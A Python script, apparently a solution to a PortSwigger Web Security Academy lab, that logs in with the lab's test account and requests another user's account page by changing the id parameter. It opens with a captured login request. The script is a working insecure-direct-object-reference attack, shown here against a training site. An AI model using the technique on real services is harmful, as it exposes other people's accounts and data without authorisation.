'''

POST /login HTTP/2
Host: 0a43002f030fa159815a9de200af002b.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Origin: https://0a43002f030fa159815a9de200af002b.web-security-academy.net
Connection: keep-alive
Referer: https://0a43002f030fa159815a9de200af002b.web-security-academy.net/login
Cookie: session=dQctXc16RxTs1fENaxHOPjTnuzrhLutH
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
TE: trailers

csrf=Cb8XX7RqJXdCILpCm4wzSmISOYvuQ6dH
username=wiener
password=peter
'''

import requests

DOMAIN = "0a43002f030fa159815a9de200af002b.web-security-academy.net"

HEADERS = {
    "Host": DOMAIN,
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": f"https://{DOMAIN}",
    "Connection": "keep-alive",
    "Referer": f"https://{DOMAIN}/login",
    "Cookie": "session=8g3T9Zz1G6yQ9Zj3sJf8X3v5Y3t6f5z",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "TE": "trailers"
}

def get_csrf_token():
    response = requests.get(f"https://{DOMAIN}/login", headers=HEADERS)
    csrf_token = response.text.split('name="csrf" value="')[1].split('"')[0]
    HEADERS["Cookie"] = response.headers["Set-Cookie"].split(";")[0]
    return csrf_token

def login(username, password):
    csrf_token = get_csrf_token()
    data = {
        "csrf": csrf_token,
        "username": username,
        "password": password
    }
    response = requests.post(f"https://{DOMAIN}/login", headers=HEADERS, data=data, allow_redirects=False)
    
    if response.status_code == 302:
        print(f"Logged in as {username}")

def get_carlos_api():
    response = requests.get(f"https://{DOMAIN}/my-account?id=carlos", headers=HEADERS, allow_redirects=False)
    
    print(response.text)

login("wiener", "peter")
get_carlos_api()